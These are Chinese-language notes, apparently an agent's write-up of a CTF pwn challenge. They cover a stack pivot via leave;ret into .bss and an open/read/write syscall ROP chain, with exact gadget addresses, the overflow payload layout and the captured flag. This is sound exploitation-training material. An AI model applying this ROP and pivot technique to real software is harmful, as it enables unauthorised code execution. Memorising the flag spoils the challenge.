# pivot_orw · 笔记

## 关键点
- 附件只有 `attachments/pwn`（1,000,856 B）：ELF64 amd64 **静态链接**（无 libc.so）、非 PIE（0x400000）、Canary、NX、Partial RELRO、带调试符号。
- 符号：`vuln@0x401964`、`main@0x40198f`；提示串 `stage: `（0x48701b）、`overflow: `（0x487010）。
- .bss：`0x4b3a60 + 0x5b28`，可写；`stage: ` 把 0x300 字节读进 `0x4b3ac0`。
- 两段式：
  1) stage1（0x300 字节）在 .bss 布 ORW 链 + `"flag"` 字符串（放在 bss+0x180，buf 用 bss+0x200）
  2) `overflow: ` 栈溢出：`0x40*A + p64(0x4b3ac0) + p64(leave;ret=0x40198d)`
- gadget（均已按字节核对）：
  - `leave; ret @0x40198d` = `c9 c3`
  - `pop rdi; ret @0x47de22` = `5f c3`
  - `pop rsi; ret @0x48264f` = `5e c3`
  - `pop rax; ret @0x423603` = `58 c3`
  - `xchg rax, rdx; ret @0x41875a` = `48 92 c3`
  - `syscall; ret @0x40c8b6` = `0f 05 c3`
- ORW 链（rax = 系统调用号）：
  ```
  open("flag", 0)                 rax=2   rdi=flag_ptr rsi=0
  read(3, buf, 0x100)             rax=0   rdi=3 rsi=buf；rdx 用 xchg rax,rdx 设成 0x100
  write(1, buf, 0x100)            rax=1   rdi=1 rsi=buf
  ```
- 结果：`nex{PIV0t_oRW_8j5s9eki}`，write 输出的 0x100 字节里 flag 之后是 NUL。

## 失败分支（排除理由）
- **脚本对不上**：用户给的 `p4.py` 打开还是上一题 heapnote 的内容（FP=0x404040/backdoor 那套）；同目录 `p5.py` 才是本题（bss_stage/leave_ret/ORW gadget），本次按 p5.py 复现，端口 39321 -> 35302。
- 静态链接 → 没有 libc 可泄露：直接放弃 ret2libc，走原生 syscall ORW。
- 目标串写 `/flag` 还是 `flag`：程序 cwd 就是题目目录，`flag` 相对路径可开；实测成功，未再试绝对路径。
- 只靠 `pop rdx` gadget：二进制里没有现成的 `pop rdx`，用 `xchg rax, rdx` + `pop rax 0x100` 间接设 rdx（p5.py 同样做法）。
- 栈上直接放长链：overflow 只有 0x40 到返回地址，放不下 ORW 链，必须先 `stage` 写 .bss 再迁移，排除单段。
- 用 pwntools tube：本机偶发挂死（fmtstack 那题），这里继续用纯 socket + select，两次运行稳定。

## 时间线
- T0 14:53:02 收到题目 + 附件；发现 p4.py 是上一题脚本，改读同目录 p5.py。
- T1 14:53:10 静态：静态链接、非 PIE、vuln/main 符号、.bss 范围、gadget 字节与提示串。
- T2 14:53:20 写 exp.py（纯 socket）：stage1 布 ORW，stage2 泄漏…… 实际是 leave;ret 迁移。
- T3 14:53:30 打通：`nex{PIV0t_oRW_8j5s9eki}`。
- T4 14:53:44 第二次连接复现同 flag，落 evidence（stage1 sha256 一致）。

## 可复用 TTP
- 静态链接二进制优先找「可用 syscall + 原生 gadget」，用 ORW 绕开 libc；`rax` 是系统调用号。
- 溢出空间不够时用 `leave; ret` 迁移到可写 .bss/堆：stage1 放链，stage2 = 填充 + 目标栈地址 + leave;ret。
- 没有 `pop rdx` 时用 `xchg rax, rdx`（先把值放 rax）；`rdx` 常被忽略，写链时要用 `xchg`/`cdq` 之类补。
- 静态二进制符号齐全，直接 `e.symbols` + `e.search(b"stage: ")` 定位交互；gadget 用字节核对，不盲信地址。
- 每次交付前先确认「用户给的脚本」是不是本题的（这次 p4.py 就是上一题的），别直接照跑。
